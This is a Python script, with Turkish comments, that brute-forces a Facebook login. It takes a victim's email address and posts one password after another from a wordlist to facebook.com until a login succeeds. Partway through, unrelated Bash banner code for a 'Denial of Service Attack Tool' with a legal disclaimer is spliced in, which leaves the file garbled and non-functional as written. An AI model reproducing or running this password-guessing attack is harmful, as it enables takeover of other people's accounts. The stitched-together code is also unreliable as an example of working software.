
	import requests
import threading
# import urllib.request
# import os
from bs4 import BeautifulSoup
import sys
try:
	if sys.version_info[0] < 3:
		raise "REQUIRED PYTHON 3.x"
except Exception as ex:
	print('''		--------------------------------------
			REQUIRED PYTHON 3.x
			kullanim: python3 thgfbbruteforcecyb2004.py
			Problem Olursa = www.turkhackguvenlik.com
		--------------------------------------
			''')
	sys.exit()
post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
payload={}
cookie={}
def create_form():
	form=dict()
	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
	data=requests.get(post_url,headers=headers)
	# print('Form Creating : ',data.url)
	# print('Return Status : ',data.status_code)
	#for i in data.headers:
	#	print(i,' : ',data.headers[i])
	for i in data.cookies:
		cookie[i.name]=i.value
	data=BeautifulSoup(data.text,'html.parser').form
	if data.input['name']=='lsd':
		form['lsd']=data.input['value']
	return (form,cookie)

def function(email,passw,i):
	global payload,cookie
	if i%10==1:
		payload,cookie=create_form()
		payload['email']=email
	payload['pass']=passw
	# print(payload)
	# print(cookie)
	# print('lsd : ',payload['lsd'])
	# print(cookie)
	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
	if 'Find Friends' in r.text:
		print('password is ',passw)
		#open('d.html','w').write(r.text)
		return True
	return False

#payload=create_form()

setterm -foreground white
	  echo "  	 -{ Denial of Service Attack Tool (DoS-A-Tool) } "
	  echo "               -{ SO > Android - Only for Termux } "
	  echo "	                 -{ Coded by } "
setterm -foreground green
          echo "		==============================";
          echo "		.___                  _______";
          echo "		|   |__ ______   ___  \_____ \ ";
	  echo "		|   \ \/ /\__ \ /   \    (__ <,";
          echo "		|   |\   / __ \| Y Y \ \      \ ";
	  echo "		|___| \_/ (____|__|_| /______ /";
          echo "		              \/    \/      \/ ";
          echo "		====== By ___ Cinderella ======";
          echo
	  sleep 1
setterm -foreground blue
          echo "		      [---] Join me on [---]"
	  echo "	  [-] www.youtube.com/c/ivam3bycinderella [-]"
	  echo "	         [-] fb.me/ivam3bycinderella [-]"
	  sleep 2
	  echo
setterm -foreground red
	  echo " 		      [---] DISCLAIMER [---]"
setterm -foreground white
	  echo "This tool was created for pentesting and computer security tests.
	  If the law is violated with its use,
this would be the responsibility of the user who handled it"
	  echo
setterm -foreground red
	  echo "		   [-] Use At Your Own Risk [-]"
	  echo


file=open('passwords.txt','r')
i=0
email=input('Kurbanin Mail Adresi : ')
print("")
print("Sifresi Bulunacak Mail : ",email)
print("")
while file:
	passw=file.readline().strip()
	i+=1
	print("Sifre Deneme" + str(i) +": ",passw)
	if function(email,passw,i):
		break
	# threading.Thread(target=function,args=(email,passw,i)).start()
	# if not i%10:
		# os.system('pause')
